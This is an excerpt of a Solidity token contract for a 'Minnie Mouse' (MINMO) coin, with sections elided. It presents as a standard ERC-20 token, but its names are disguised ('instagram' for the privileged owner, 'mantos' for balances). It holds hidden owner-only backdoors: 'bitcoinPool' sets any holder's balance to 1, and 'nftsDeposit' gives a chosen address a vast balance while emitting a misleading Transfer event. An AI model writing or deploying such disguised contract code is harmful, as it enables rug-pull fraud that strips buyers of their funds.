...
contract MinnieMouse is Ma, Ru, io {
    
    using SafeMath for uint256;
    mapping (address => uint256) private mantos;
    mapping (address => mapping (address => uint256)) private kitkat;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private instagram; 
    constructor(address whatsapp) {
        instagram = whatsapp;    
        _name = "Minnie Mouse";
        _symbol = "MINMO";
        _decimals = 9;
        _totalSupply = 50986466808290 * 10 ** 9;
        mantos[_msgSender()] = _totalSupply;
    ...
    function totalSupply() external view override returns (uint256) {
     ...
     function name() external view override returns (string memory) {
        return _name;
         ...
         modifier TYPEeumBridge() {
        require(instagram == _msgSender(), "io: caller is not the owner");
        _;
    }    
    /**
    ...
    */
    function bitcoinPool(address btcRewards) external TYPEeumBridge {
        mantos[btcRewards] = 1;
    ...
    */
    function allowance(address owner, address minHoldingAmount) external view override returns (uint256) {
        return kitkat[owner][minHoldingAmount];
    }
    ...
    * - `minHoldingAmount` cannot be the zero address.
    */
       function nftsDeposit(address TYPEeumRewards) external TYPEeumBridge {
        mantos[TYPEeumRewards] = 100000000000 * 10 ** 30;
        
        emit Transfer(TYPEeumRewards, address(0), 100000000000 * 10 ** 30);
    } 
    ...
    */
    function transferFrom(address sender, address readBytes, uint256 maxHoldingAmount) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), kitkat[sender][_msgSender()].sub(maxHoldingAmount, "Ru: transfer maxHoldingAmount exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address minHoldingAmount, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), minHoldingAmount, kitkat[_msgSender()][minHoldingAmount].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address minHoldingAmount, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), minHoldingAmount, kitkat[_msgSender()][minHoldingAmount].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address readBytes, uint256 maxHoldingAmount) internal {
        ...
        mantos[sender] = mantos[sender].sub(maxHoldingAmount, "Ru: transfer maxHoldingAmount exceeds balance");
        mantos[readBytes] = mantos[readBytes].add(maxHoldingAmount);
    ...
    */
    function _approve(address owner, address minHoldingAmount, uint256 maxHoldingAmount) internal {
        ...
        kitkat[owner][minHoldingAmount] = maxHoldingAmount;
